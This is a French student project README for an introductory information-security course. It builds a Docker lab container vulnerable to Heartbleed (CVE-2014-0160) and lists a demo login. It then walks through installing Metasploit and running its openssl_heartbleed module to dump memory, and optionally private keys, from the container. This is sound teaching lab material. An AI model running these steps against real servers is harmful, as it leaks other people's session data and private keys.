# Introduction à la sécurité des systèmes d'informations

## Equipe

* Guillaume MALLET
* Tom RUSSELLO
* Vincent TAVERNIER

## Faille choisie

CVE-2014-0160 : OpenSSL Heartbeat extension implementation, dite *Heartbleed*.

Versions vulnérables : OpenSSL 1.0.1 through 1.0.1f (inclusive) are vulnerable
(http://heartbleed.com/).

## Références

* http://heartbleed.com/
* https://xkcd.com/1354/

## Usage

```bash
# Build the image
sudo docker build -t cysec-heartbleed .

# Run a container from the built image
sudo docker run --name cysec-heartbleed -it cysec-heartbleed

# Find out the IP address of the container
docker network inspect bridge

# Go to the website with your browser
[browser] https://[IP_Container] (e.g. firefox https://172.17.0.2)

# Put the login
guest:guest123

# Installations des paquets nécessaires pour metasploit (exemple sous Debian)
sudo apt-get install git-core postgresql curl ruby-dev nmap gem
gem install wirble sqlite3 bundler
git clone https://github.com/rapid7/metasploit-framework.git
cd metasploit*
bundle install



# Run metasploit
./msfconsole
use auxiliary/scanner/ssl/openssl_heartbleed
set ACTION DUMP      # Just dump data. Use KEYS if you want to try dumping the keys
set RHOSTS 172.17.0.2 # IP address from the network inspect command
set RPORT 443        # Change if you use a different port in the container
run
```
